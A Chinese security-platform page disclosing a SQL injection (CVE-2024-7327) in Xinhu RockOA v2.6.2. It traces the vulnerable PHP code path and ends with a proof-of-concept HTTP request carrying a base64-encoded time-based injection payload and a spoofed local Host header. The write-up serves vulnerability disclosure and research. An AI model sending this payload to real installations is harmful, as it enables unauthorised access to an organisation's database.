
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】Xinhu RockOA v2.6.2 SQL注入漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】Xinhu RockOA v2.6.2 SQL注入漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-07-21 22:30:35</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/607/" class="am-link-muted">Mstir</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-warning">高危</span></td>
                  <td class="am-text-center am-hide-sm-down">1</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-7327<br>Created: 07/31/2024 02:15 PM<br>Updated: 08/01/2024 01:20 PM<br>Changes: 07/31/2024 02:15 PM (57), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)<br>Submitter: Mstir@Wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<blockquote>
<p>信呼-OA系统是一个办公自动化软件，用于提高组织内部的沟通效率和管理效率。</p>
</blockquote>
<p>在信呼OA系统2.6.2版本的<code>/webmain/task/openapi/openmodhetongAction.php</code>文件中，存在一个前台SQL注入漏洞。当<code>$nickName</code>变量经过base64解码后被加入到<code>uarr</code>数组中，并最终传递给<code>$db-&gt;record()</code>方法进行SQL查询时，攻击者可以利用此漏洞进行SQL注入攻击。此外，还需要注意父类<code>openapiAction.php</code>中的<code>init</code>方法，其中的<code>Host</code>需要属于<code>127.0.0.1</code>或<code>192.168.x.x</code>的范围。</p>
<h1>审计过程</h1>
<p>在 /webmain/task/openapi/openmodhetongAction.php 中</p>
<p><strong>\$nickName被base64解码之后带入了uarr数组中 然后传入到 \$db-&gt;record()</strong></p>
<pre class="codehilite"><code class="language-php">    public function dataAction()
    {
        $mobile = $this-&gt;get(&#039;mobile&#039;);
        $xcytype = $this-&gt;get(&#039;xcytype&#039;);
        $openid = $this-&gt;get(&#039;openid&#039;);
        $nickName = $this-&gt;jm-&gt;base64decode($this-&gt;get(&#039;nickName&#039;));
        $htdata = array();
        $db     = m(&#039;wxxcyus&#039;);
        $uarr[&#039;mobile&#039;]     = $mobile;
        $uarr[&#039;xcytype&#039;]    = $xcytype;
        $uarr[&#039;openid&#039;]     = $openid;
        $uarr[&#039;nickName&#039;]   = $nickName;
        $uarr[&#039;province&#039;]   = $this-&gt;get(&#039;province&#039;);
        $uarr[&#039;city&#039;]       = $this-&gt;get(&#039;city&#039;);
        $uarr[&#039;gender&#039;]     = $this-&gt;get(&#039;gender&#039;);
        $uarr[&#039;dingyue&#039;]    = $this-&gt;get(&#039;dingyue&#039;);
        $uarr[&#039;avatarUrl&#039;]  = $this-&gt;jm-&gt;base64decode($this-&gt;get(&#039;avatarUrl&#039;));
        $where = &quot;`openid`=&#039;$openid&#039;&quot;;
        if($db-&gt;rows($where)==0){
            $uarr[&#039;adddt&#039;] = $this-&gt;now;
            $where=&#039;&#039;;
        }else{
            $uarr[&#039;optdt&#039;] = $this-&gt;now;
        }
        $db-&gt;record($uarr, $where);
</code></pre>

<p>跟进该方法 /include/Model.php</p>
<pre class="codehilite"><code class="language-php">    public function record($arr, $where=&#039;&#039;)
    {
        return $this-&gt;db-&gt;record($this-&gt;table, $arr, $where);
    }
</code></pre>

<p>到了 /include/class/mysql.php</p>
<pre class="codehilite"><code class="language-php">    public function record($table,$array,$where=&#039;&#039;)
    {
        $addbool    = true;
        if(!$this-&gt;isempt($where))$addbool=false;
        $cont       = &#039;&#039;;
        if(is_array($array)){
            foreach($array as $key=&gt;$val){
                $cont.=&quot;,`$key`=&quot;.$this-&gt;toaddval($val).&quot;&quot;;
            }
            $cont   = substr($cont,1);
        }else{
            $cont   = $array;
        }
        $table = $this-&gt;gettables($table);
        if($addbool){
            $sql=&quot;insert into $table set $cont&quot;;
        }else{
            $where = $this-&gt;getwhere($where);
            $sql=&quot;update $table set $cont where $where&quot;;
        }
        return $this-&gt;tranbegin($sql);
    }
</code></pre>

<p>在这里带入SQL语句查询 导致注入 同时还要注意下父类openapiAction.php中的init方法 这里的Host需要属于127.0.0.1 或 192.168.x.x 的范围.</p>
<pre class="codehilite"><code class="language-php">public function initAction()
  {
    $this-&gt;display= false;
    $openkey        = $this-&gt;post(&#039;openkey&#039;);
    $this-&gt;openkey  = getconfig(&#039;openkey&#039;);
    if($this-&gt;keycheck && HOST != &#039;127.0.0.1&#039; && !contain(HOST,&#039;192.168&#039;) && $this-&gt;openkey != &#039;&#039;){
      if($openkey != md5($this-&gt;openkey))$this-&gt;showreturn(&#039;&#039;, &#039;openkey not access&#039;, 201);
    }
    $this-&gt;getpostdata();
  }
</code></pre>

<h1>POC</h1>
<pre class="codehilite"><code class="language-http">GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Cookie: loginname=admin; jueseid=1; danweiid=1; quanxian=0; PHPSESSID=cv1c2tefjckfjnpin34n2oc8h1; deviceid=1708223329907
Host: 127.0.0.1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
sec-ch-ua: &quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Windows&quot;
sec-fetch-user: ?1
</code></pre>

<p><img alt="null" src="/media/images/2024/07/21/f127a5a5-32b9-4257-a98f-d2477402fbac-DXiCpt9r.png" /></p>
<p><img alt="null" src="/media/images/2024/07/21/021326a5-6bb0-4820-bdd2-646defd5444c-RbULzfdF.png" /></p>
          </div>

          


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>